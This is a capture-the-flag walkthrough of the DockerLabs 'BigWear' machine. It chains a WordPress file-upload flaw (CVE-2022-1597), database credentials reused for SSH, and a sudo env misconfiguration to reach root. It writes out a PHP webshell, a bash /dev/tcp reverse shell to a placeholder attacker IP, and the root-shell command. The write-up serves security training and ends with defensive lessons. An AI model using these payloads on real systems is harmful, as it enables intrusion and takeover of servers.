// 01

Summary

BigWear is an Intermediate difficulty machine from the DockerLabs platform. It runs on Linux and exposes two services: SSH (port 22) and an HTTP (port 80) web server hosting a WordPress installation.

This machine is a case study on the vulnerability chain that arises from poor maintenance: an outdated WordPress plugin allows arbitrary file uploads (CVE-2022-1597), giving us an initial shell as www-data. From there, we find plaintext database credentials in wp-config.php. The administrator reuses that password for their system account, allowing us to escalate to mario via SSH. Finally, a misconfigured sudo rule delivers full root access.

The full attack vector demonstrates that security is a chain: a single weak link (the unpatched plugin) triggers an escalation that compromises the entire system.

Phase Technique / Tool Result

Recon Nmap -p- -sSCV full scan Port 22 SSH · Port 80 Apache + WordPress

// Note — ethical hacking context

All techniques documented in this write-up are applied exclusively in controlled, legal environments such as DockerLabs. Using these techniques outside an authorized scope is illegal and may carry serious criminal consequences. This document is intended exclusively for educational purposes.

Reconnaissance

1
Deploy the machine

We deploy the container using the official DockerLabs script. It builds the image from the bigwear.tar archive, assigns an IP within the Docker network (172.17.0.x), and keeps the container running.

// CVE-2022-1597 — Arbitrary File Upload

The vulnerability affects the Advanced File Manager plugin up to version 7.1.4. A user with the Subscriber role (or higher) can upload arbitrary files without MIME-type validation, including PHP scripts that will execute on the server. This grants direct Remote Code Execution (RCE).

// 04

Exploitation

1
Register as Subscriber and upload webshell

The WordPress installation allows public user registration. We register with the Subscriber role, which is sufficient to exploit CVE-2022-1597. We prepare a minimal PHP webshell to execute commands:

SHELL
$ echo "<?php system(\$_GET['cmd']); ?>" > shell.php

We navigate to the plugin from the WordPress panel (wp-admin → File Manager), upload shell.php to the uploads folder, and access it to verify command execution:

VERIFY RCE
$ curl 'http://172.17.0.2/wp-content/uploads/shell.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
2
Upgrade to reverse shell

With RCE confirmed, we start a Netcat listener on our machine and send a reverse shell through the webshell. We use Bash for the reverse shell as it is the most reliable option on Linux systems.

LISTENER
$ nc -lvnp 4444
REV SHELL
$ curl 'http://172.17.0.2/wp-content/uploads/shell.php?cmd=bash+-c+%27bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261%27'
listening on [any] 4444 ...
connect to [YOUR_IP] from (UNKNOWN) [172.17.0.2] 49832
bash: no job control in this shell
www-data@bigwear:/var/www/html/wp-content/uploads$

// Tip — URL encoding

Special characters in the reverse shell payload (spaces, >, &) must be URL-encoded to be transmitted via GET. Use python3 -c "import urllib.parse; print(urllib.parse.quote('YOUR_PAYLOAD'))" to automatically encode the string.

// 05

Post-Exploitation

1
TTY stabilization

The obtained shell is a dumb shell without a full TTY. This causes problems: Ctrl+C kills the session, sudo fails without showing a prompt, and editors like vim won't work. We stabilize the shell in three steps:

STEP 1
www-data$ script /dev/null -c bash
STEP 2
# Ctrl+Z to send to background
$ stty raw -echo ; fg
STEP 3
www-data$ export TERM=xterm
2
Credential hunting — wp-config.php

The wp-config.php file stores WordPress database credentials in plaintext. It is one of the first files to check when compromising a WordPress server, since administrators frequently reuse these passwords for their system accounts.

CONFIG
www-data$ cat /var/www/html/wp-config.php | grep -E 'DB_USER|DB_PASSWORD|DB_NAME'
define( 'DB_NAME', 'bigwear_db' );
define( 'DB_USER', 'mario' );
define( 'DB_PASSWORD', 'bigwear2024!' );
define( 'DB_HOST', 'localhost' );

mario
Password
bigwear2024!
Source
wp-config.php
3
SSH login — password reuse

// 06

Privilege Escalation

1
Sudo enumeration

The first vector to check is always sudo -l, which lists the commands the current user can run as root without a password. A positive result here is usually the fastest path to escalation.

SUDO
mario@bigwear:~$ sudo -l
Matching Defaults entries for mario on bigwear:
env_reset, mail_badpass
 
User mario may run the following commands on bigwear:
(ALL : ALL) NOPASSWD: /usr/bin/env

// Misconfiguration detected

/usr/bin/env allows executing any program in the current environment. If it can be run as root without a password, it can launch any command as root, including a shell. This is a sudo misconfiguration documented in GTFOBins.

// 07

Root

1
Escalate via sudo env

With sudo /usr/bin/env we can launch /bin/bash directly as root. The env command without environment variables simply executes the binary passed to it — in this case, a shell:

ROOT
mario@bigwear:~$ sudo /usr/bin/env /bin/bash
root@bigwear:/home/mario#
 
root@bigwear:~# whoami
root
 
root@bigwear:~# cat /root/root.txt
c0ngr4ts_y0u_0wn3d_b1gw34r!

// Lessons learned

This machine perfectly illustrates the concept of defence in depth. Each failed security layer (outdated plugin → plaintext credentials → password reuse → misconfigured sudo) chains into the next. A single control applied correctly at any point would have broken the attack chain. Keep plugins updated, use environment variables or secret managers, and regularly audit your sudo rules.

Glossary

WPScan — WordPress Security Scanner
WPScan is the reference tool for auditing WordPress installations. It performs version enumeration of the core, themes and plugins; user detection via techniques such as author enumeration and XML-RPC; and vulnerability lookups against public databases like WPVulnDB. Its --plugins-detection aggressive mode checks known installation paths for thousands of plugins to detect installed ones even when they are not visible in the frontend. A free API key is required to access the real-time vulnerability database; without it, only outdated versions are reported without CVE details. Indispensable in any WordPress audit.
CVE — Common Vulnerabilities and Exposures
The CVE system is a public dictionary of security vulnerabilities maintained by MITRE Corporation. Each entry has a unique identifier (CVE-YEAR-NUMBER), a description, and references to advisories and exploits. The CVSS (Common Vulnerability Scoring System) assigns a severity score from 0 to 10. CVE-2022-1597 (Arbitrary File Upload in Advanced File Manager) has a CVSS of 8.8 (High) because it enables remote code execution with low privilege level in WordPress. Databases such as NVD (nvd.nist.gov) and Exploit-DB cross-reference CVEs with public exploits and mitigations.
Reverse Shell
A reverse shell is a technique where the victim system initiates a connection back to the attacker's machine (as opposed to a bind shell, where the attacker connects to the victim). This is essential in penetration testing because most firewalls block inbound connections but allow outbound ones. The Bash payload bash -i >& /dev/tcp/IP/PORT 0>&1 redirects stdin, stdout and stderr to a TCP socket, creating a remote interactive shell. Netcat (nc -lvnp 4444) acts as the listener on our machine.
Password Reuse
Password reuse is one of the most common and effective attack vectors in real environments. It occurs when a user or administrator uses the same password across multiple services or accounts. In a WordPress context, the database credentials stored in wp-config.php are frequently reused as system user passwords. Mitigation involves using a password manager (Bitwarden, 1Password), generating unique random passwords for each service, and separating application credentials from system ones via dedicated users with minimal permissions (principle of least privilege).
GTFOBins — Unix Binaries Privilege Escalation
GTFOBins (gtfobins.github.io) is a curated list of standard Unix binaries that can be used to escalate privileges, bypass security restrictions, or execute arbitrary commands in constrained access contexts. It is community-maintained and organised by technique: sudo, SUID, capabilities, cron, etc. For env specifically, if it has unrestricted sudo permissions, it allows executing any binary as root via sudo env /bin/sh. It is the first reference to consult when sudo -l reveals an unexpected binary.
TTY — Shell Stabilisation
A TTY (Teletypewriter) is a full terminal interface that provides support for control signals (Ctrl+C, Ctrl+Z), command history, and correct rendering of curses-based interfaces (vim, sudo, etc.). Reverse shells obtained via webshells are dumb shells without TTY, which causes Ctrl+C to kill the session. The command script /dev/null -c bash forces pseudo-TTY allocation: script records terminal sessions and pointing it to /dev/null discards the log; -c bash specifies that the process to record is an interactive bash session, which creates a full TTY. The subsequent steps (stty raw -echo; fg and export TERM=xterm) synchronise the terminal size and disable local echo so the shell works correctly.
